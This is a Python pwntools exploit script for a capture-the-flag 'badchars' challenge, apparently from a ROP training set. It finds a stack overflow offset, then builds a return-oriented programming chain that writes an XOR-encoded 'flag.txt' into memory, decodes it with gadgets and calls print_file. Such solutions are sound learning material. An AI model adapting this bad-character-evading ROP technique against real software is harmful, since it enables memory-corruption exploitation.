#!/usr/bin/env python3

from pwn import *

exe = ELF("badchars_patched")
libc = ELF("libbadchars.so")

context.binary = exe
rop = ROP(exe)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    payload = cyclic(100, alphabet = 'bcdefhijklmnopqrstuvwyz')
    r.sendlineafter(b'>', payload)
    r.wait()
    core = r.corefile
    stack = core.rsp
    rip = core.read(stack, 4)
    offset = cyclic_find(rip, alphabet = 'bcdefhijklmnopqrstuvwyz')

    r = conn()

    popr12r13r14r15 = rop.find_gadget(["pop r12", "pop r13", "pop r14", "pop r15", "ret"])[0]
    popr14r15 = rop.find_gadget(["pop r14", "pop r15", "ret"])[0]
    datasec = exe.symbols.data_start + 8
    xorstr = xor('flag.txt', 2)

    xorsploit = b''
    dataoff = 0
    for c in xorstr:
        xorsploit += pack(popr14r15)
        xorsploit += pack(0x2)
        xorsploit += pack(datasec + dataoff)
        xorsploit += pack(exe.symbols.usefulGadgets)
        dataoff += 1

    rop.raw([popr12r13r14r15, xorstr, datasec, 0x0, 0x0, exe.symbols.usefulGadgets + 12, xorsploit])
    rop.print_file(datasec)
    ropchain = rop.chain()
    payload = flat({offset : ropchain})
    r.sendlineafter(b'>', payload)
    r.recvuntil('you!\n')
    flag = r.recvline()
    print(flag)


if __name__ == "__main__":
    main()
